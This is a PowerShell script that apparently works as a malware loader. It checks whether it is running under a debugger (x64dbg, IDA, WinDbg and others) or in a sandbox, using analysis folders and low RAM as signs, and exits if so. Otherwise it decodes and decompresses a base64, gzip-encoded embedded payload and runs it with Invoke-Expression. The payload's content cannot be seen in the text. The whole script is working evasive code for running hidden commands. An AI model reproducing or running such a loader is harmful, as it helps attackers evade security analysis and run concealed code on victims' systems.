# Anti-analysis checks
function Test-IsDebugger {
    try {
        $debugger = [System.Diagnostics.Debugger]::IsAttached
        if ($debugger) { return $true }
        
        # Check for common debugger processes
        $debuggers = @('x64dbg', 'x32dbg', 'ollydbg', 'ida64', 'ida', 'windbg')
        $processes = Get-Process | Where-Object { $_.ProcessName -in $debuggers }
        if ($processes) { return $true }
        
        return $false
    } catch {
        return $false
    }
}

function Test-IsSandbox {
    try {
        # Check for common sandbox artifacts
        $sandbox_artifacts = @(
            'C:\sample',
            'C:\malware',
            'C:\virus',
            'C:\analysis'
        )
        
        foreach ($artifact in $sandbox_artifacts) {
            if (Test-Path $artifact) { return $true }
        }
        
        # Check for low RAM (common in sandboxes)
        $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
        if ($ram -lt 2GB) { return $true }
        
        return $false
    } catch {
        return $false
    }
}

# Main execution
try {
    Write-Host "Starting script execution..." -ForegroundColor Green
    
    # Skip if in debugger or sandbox
    if (Test-IsDebugger -or Test-IsSandbox) {
        Write-Host "Debugger or sandbox detected, exiting..." -ForegroundColor Red
        exit
    }
    
    Write-Host "Loading encoded payload..." -ForegroundColor Yellow
    $encoded = "H4sIAGqCUGgC/41WUW/bNhB+168gHD3YQ6SlTR8CAwHmqUmTrYkN210wBEHCyCebi0RqJBXX2Prfd0dKluw6WP0gi9Tx7uPdx+94xOZgLDOpFqVlmdIsyRV/ma0gz5l6ziqTciuUDI7YfCVMY5gqabmQhr1yLVRl2EStQftVGXBbaTDMKmbJ+UJkGWiQtusQP6UrKf6uwATo/A/0w59zHISW6yXYK4Urz1lvqdQyhzhVRS8IS6Vp8sOHUzQTBaiKhqcnQVj8pkZLa1IchlZXQD4vK5m6UAvIhBT0aoKsmaR9R7dg10q/JEpK8NP/BAx/Jde86LtX+t0bq4VcPoQrRCV5AcftJyHtgwO2P1cDdLMD93QPqzd1EPqFNi2TXFByztktrKPx81+IhM02xkIRI754ptIXsCaeN5bt4rTFfd5xFf8KSyHrTfVb0MzjZKGs8rz+G7Te1lwQio7XeGQ2Mr3D+SsuF1gGeh1L6G+z/xN7d3Jygr4ynhtonW1fRMb6zvOgs2v63WlhIRpXtkQ3vU4FTJWmYExW5cSgLfqnoUPf23GiAakm65I3k98YIJYfDUc7WTDayw9Hc3ttwwXtE7mdrjqRfdQLrfFgdYNmXOSwGLLwsY3wvXfvE7nL87xLGpfTbbUxsd3a4/k10B9sYX0LWs5/Aht5Zl3LTL3F9bXATTyEH8E6lPsEDgWtPWe/tIB6V3XaesQfkK/DZHwz+TK/mN6Obi5as/GMDPoE464QNdXvhDx9/zguQaMwyKXHN4gTXjrh2S4e6XSF2UxJXLZxJtNxcjGbjaePo2lydT2/SOZfpp2IN1AovXkzaqIK5AMqVx10rizPJ6uNESnP/dpOJYJt8pvcdEnt8hKPFot+b6IVURhM79jHrSdwV6rCih1aMwP9KtJ2ST3eWdKB0bCFHFCNj9gNCjKDr5BWLm+eek5GezPUVMotk17vUJL5UuInkZo4jnssulQalhojLRKVI1k/aQBJXhEKMy47jELpwqt3JrSxQWhaMp3vsytqkjQMX0E/IyvJ30dhypxvDvjcQfwkvSd23RoMD+BMNlwGaAEcz10/fIENumQdXPHvsDFNmboRyPYJT2C/Y3xPkw+Dnk+o64ytGAYdYZyCqXISyze6SNToCOu2s8j1L9/FokZBt30icMzaj9FAP2IJbtIC49g5C3TBsY9kmF5/JmnuEkcI6b7uHdfjeMLt6mE4xMLM6++3iKnvybQjgn6rRZmDRTVsJTjHs/MvQ9mMnHf3JK9txJaSR2wKfMGwUyC/fJXtCjog6dbgOx1RJalH0QF/u1T4rJYMLfVmuPVxgAp/4uVDrbtwkhy4rEo3muJhfoXomji1F9G5SiHY6RtdBLffn5pawQ/AmKJiOvqMtMYMKK9rdPVwhTeknP0zbJl4izlmZyf0eobvAzxNtQS04tq7ms8npF5nJ+3YiSjdgXwVK2NV8c4bNWZ+8r2bJEsH6LNSJVYEsS5XzGHpnBxHSjo67sOhA5OsIH0hEWlZTNrh7JzARLMcoGTRjchzYQArtTB0PfDRfRNc0T2CnMBXTmwL2utQqJtD9Y79zHDVTjftIvGuUo77sK6HvlGFvda5sxlPjZbzBzWQbwj7ni75G/BWaP/HBcoo+w+afl5WZQsAAA=="
    
    Write-Host "Decoding Base64..." -ForegroundColor Yellow
    try {
        $compressed = [System.Convert]::FromBase64String($encoded)
        Write-Host "Base64 decode successful" -ForegroundColor Green
    } catch {
        Write-Host "Base64 decode failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Setting up decompression..." -ForegroundColor Yellow
    try {
        $decompressed = New-Object System.IO.MemoryStream
        $decompressed.Write($compressed, 0, $compressed.Length)
        $decompressed.Seek(0, 0) | Out-Null
        Write-Host "MemoryStream setup successful" -ForegroundColor Green
    } catch {
        Write-Host "MemoryStream setup failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Creating GzipStream..." -ForegroundColor Yellow
    try {
        $gzipStream = New-Object System.IO.Compression.GzipStream($decompressed, [System.IO.Compression.CompressionMode]::Decompress)
        Write-Host "GzipStream creation successful" -ForegroundColor Green
    } catch {
        Write-Host "GzipStream creation failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Reading decompressed data..." -ForegroundColor Yellow
    try {
        $reader = New-Object System.IO.StreamReader($gzipStream)
        $script = $reader.ReadToEnd()
        Write-Host "Data read successful" -ForegroundColor Green
    } catch {
        Write-Host "Data read failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Cleaning up streams..." -ForegroundColor Yellow
    try {
        $reader.Close()
        $gzipStream.Close()
        $decompressed.Close()
        Write-Host "Stream cleanup successful" -ForegroundColor Green
    } catch {
        Write-Host "Stream cleanup failed: $_" -ForegroundColor Red
        throw
    }
    
    Write-Host "Executing script..." -ForegroundColor Yellow
    try {
        Invoke-Expression $script
        Write-Host "Script execution completed" -ForegroundColor Green
    } catch {
        Write-Host "Script execution failed: $_" -ForegroundColor Red
        throw
    }
    
} catch {
    Write-Host "Error occurred: $_" -ForegroundColor Red
    Write-Host "Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
    exit
} 